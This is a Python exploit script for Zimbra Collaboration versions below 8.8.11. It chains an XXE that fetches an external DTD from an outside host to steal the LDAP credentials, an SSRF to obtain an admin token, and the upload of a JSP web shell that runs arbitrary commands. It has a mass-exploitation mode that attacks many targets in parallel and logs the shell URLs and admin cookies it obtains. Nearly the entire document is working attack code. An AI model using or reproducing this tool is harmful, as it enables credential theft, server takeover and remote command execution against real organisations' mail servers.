## Zimbra Collaboration < 8.8.11 Servlet XXE
## https://www.exploit-db.com/exploits/46693
## https://www.exploit-db.com/exploits/46967
## Created By Con7ext
## Exploit-Kita

#!/usr/bin/env python3
import requests
import warnings
import sys
import re
import argparse
from requests import HTTPError, Timeout, ConnectionError, TooManyRedirects
from termcolor import colored
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

def blue(str):
  return colored(str, "blue")

def green(str):
  return colored(str, "green")

def red(str):
  return colored(str, "red")

def yellow(str):
  return colored(str, "yellow")

def save(filen, content):
  f = open(filen, "a+")
  f.write(content)

def Login():
  login = """<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
   <soap:Header>
       <context xmlns="urn:zimbra">
           <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>
       </context>
   </soap:Header>
   <soap:Body>
     <AuthRequest xmlns="{xmlns}">
        <account by="adminName">{username}</account>
        <password>{password}</password>
     </AuthRequest>
   </soap:Body>
</soap:Envelope>"""
  return login

def lowLogin(site, user, pasw):
  data = Login()
  headers = {"Content-Type":"application/xml"}
  jir = requests.post(site + "/service/soap", data=data.format(xmlns="urn:zimbraAccount", username=user, password=pasw), headers=headers, verify=False, timeout=15)
  token = re.compile(r"<authToken>(.*?)<\/authToken>").findall(jir.text)[0]
  return token

def doUpload(site, token):
  filename = "todss.jsp"
  doi = """<%@ page import=\"java.util.*,java.io.*\"%>
<%
if (request.getParameter(\"cmd\") != null) {
String cmd = request.getParameter(\"cmd\");
Process p = Runtime.getRuntime().exec(cmd);
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();}}
%>
"""

  headers = {"Cookie":"ZM_ADMIN_AUTH_TOKEN="+ token}
  fil = {
    'filename1':(None,"whocare",None),
    'clientFile':(filename,doi,"text/plain"),
    'requestId':(None,"12",None),
  }
  vost = requests.post(site + "/service/extension/clientUploader/upload",files=fil,headers=headers,verify=False)
  return vost.text

def doCheck(site, token):
  headers = {"Cookie":"ZM_ADMIN_AUTH_TOKEN="+ token}
  req = requests.get(site +"/downloads/todss.jsp?cmd=uname -a", headers=headers, verify=False, timeout=15)
  return req
  
def admLogin(site, user, pasw, head):
  data = Login()
  bjir = requests.post(site + "/service/proxy?target=https://127.0.0.1:7071/service/admin/soap", data=data.format(xmlns="urn:zimbraAdmin", username=user, password=pasw), headers=head, verify=False, timeout=15)
  token = re.compile(r"<authToken>(.*?)<\/authToken>").findall(bjir.text)[0]
  return token

def getLowUser(site):
  payload = """<!DOCTYPE Autodiscover [
        <!ENTITY % dtd SYSTEM "https://k8gege.github.io/zimbra.dtd">
        %dtd;
        %all;
        ]>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Request>
        <EMailAddress>aaaaa</EMailAddress>
        <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
    </Request>
</Autodiscover>"""
  headers = {
    "Content-Type":"application/xml"
  }
  p = requests.post(site + "/Autodiscover/Autodiscover.xml", data=payload, headers=headers, verify=False, timeout=15)
  #user = re.compile("ldap_password.*?value>(.*?)<\/value", 
  if 'response schema not available' not in p.text:
    return False
  return p.text
  
def zimbra(site):
  lowUser = getLowUser(site)
  if(lowUser):
    bjir = lowUser.replace("&lt;", "<").replace("&gt;", ">")
    username = re.findall("<key name=\"zimbra_user\">\s+<value>(.*?)<\/value>", bjir)[0]
    password = re.findall("<key name=\"zimbra_ldap_password\">\s+<value>(.*?)<\/value>", bjir)[0]
    lowToken = lowLogin(site, username, password)
    headers = {"Content-Type":"application/xml"}
    headers["Cookie"] = "ZM_ADMIN_AUTH_TOKEN=" + lowToken
    headers["Host"] = "rintod:7071"
    admToken = admLogin(site, username, password, headers)
    dUpload = doUpload(site, admToken)
    shell = doCheck(site, admToken)
    if shell.status_code == 200:
      print("[+] "+ site + green(" -> Success"))
      print("[+] "+ site +"/downloads/todss.jsp?cmd=ls")
      print("[+] "+ blue(shell.text.replace("\n", "")))
      print("[!] For access the shell you need use cookie "+ yellow("ZM_ADMIN_AUTH_TOKEN="+ admToken) + "\n")
      save("zimbra-shell.xt", site +"/downloads/todss.jsp|ZM_ADMIN_AUTH_TOKEN="+admToken+"\n")
    else:
      print("[+] "+ site + blue(" -> Shell Not Found"))
      print("[!] "+ yellow("Shell Not Found") +" Try Manual")
      print("[=] Cookie: "+ blue("ZM_ADMIN_AUTH_TOKEN="+ admToken))
      save("zimbra-manual.txt", site +"|ZM_ADMIN_AUTH_TOKEN="+ admToken)
  else:
    print("[-] "+ site + red(" -> Failed"))
    
def exploit(site):
  if 'http' not in site:
    site = "https://"+ site
  else:
    site = site
  site = site.rstrip("/")
  try:
    zimbra(site)
  except (HTTPError, Timeout, ConnectionError, TooManyRedirects, Exception):
    print("[!] "+ site + yellow(" -> Unknow Error"))

if __name__ == '__main__':
  pars = argparse.ArgumentParser()
  pars.add_argument('-t','--target', required=True, help='Target')
  pars.add_argument('-m', '--mass', default=False, action='store_true', required=False, help='Mass Exploit')
  args = vars(pars.parse_args())
  
  target = args["target"]
  if(args["mass"]):
    liss = [i.strip() for i in open(target, "r").readlines()]
    zm = Pool(10)
    zm.map(exploit, liss)
  else:
    exploit(target)
